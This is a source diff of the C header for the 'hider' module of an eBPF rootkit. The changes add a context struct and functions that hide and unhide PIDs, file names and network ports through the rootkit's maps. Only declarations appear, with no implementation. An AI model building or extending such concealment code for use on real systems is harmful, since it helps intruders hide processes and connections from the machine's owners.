@@ -2,58 +2,79 @@
 #define __HIDER_H
 
 #include <bpf/libbpf.h>
+
 #include "config.h"
 #include "rootkit.skel.h"
 
+typedef struct {
+    struct rootkit *skel;
+    int hide_names_map_fd;
+    int hide_bpf_map_fd;
+    int tracked_pids_map_fd;
+    int hide_ports_map_fd;
+    bool is_initialized;
+} hider_context_t;
+
 /**
  * @brief Initialize hider with rootkit eBPF skeleton.
- * 
- * @param skel Rootkit eBPF skeleton.
- * @return int 
+ *
+ * @param hider_ctx
+ * @return int
  */
-int hider_init(struct rootkit *skel);
+int hider_init(hider_context_t *hider_ctx);
 
 /**
  * @brief Loads a PID to the rootkit's map to hide it.
- * 
- * Also hides all future childs of this process.
- * 
- * @param pid 
- * @return int 
+ *
+ * @param hider_ctx
+ * @param pid
+ * @return int
  */
-int hider_hide_pid(pid_t pid);
+int hider_hide_pid(hider_context_t *hider_ctx, pid_t pid);
 
 /**
  * @brief Loads a file name to the rootkit's map to hide it.
- * 
- * @param filename 
- * @return int 
+ *
+ * @param hider_ctx
+ * @param filename
+ * @return int
  */
-int hider_hide_file(const char *filename);
+int hider_hide_file(hider_context_t *hider_ctx, const char *filename);
+
+/**
+ * @brief Loads a port to the rootkit's map to hide it.
+ *
+ * @param hider_ctx
+ * @param port
+ * @return int
+ */
+int hider_hide_port(hider_context_t *hider_ctx, uint16_t port);
 
 /**
  * @brief Removes a PID from the rootkit's map to unhide it.
- * 
- * @param pid 
- * @return int 
+ *
+ * @param hider_ctx
+ * @param pid
+ * @return int
  */
-int hider_unhide_pid(pid_t pid);
+int hider_unhide_pid(hider_context_t *hider_ctx, pid_t pid);
 
 /**
  * @brief Removes a file name from the rootkit's map to unhide it.
- * 
- * @param filename 
- * @return int 
+ *
+ * @param hider_ctx
+ * @param filename
+ * @return int
  */
-int hider_unhide_file(const char *filename);
+int hider_unhide_file(hider_context_t *hider_ctx, const char *filename);
 
 /**
- * @brief Set the initail hide state of the rootkit.
- * 
- * It sets the loader PID and the loader's elf file to hide.
- * 
- * @return int 
+ * @brief Removes a port from the rootkit's map to unhide it.
+ *
+ * @param hider_ctx
+ * @param port
+ * @return int
  */
-int hider_set_initial_hide_state();
+int hider_unhide_port(hider_context_t *hider_ctx, uint16_t port);
 
 #endif /* __HIDER_H */
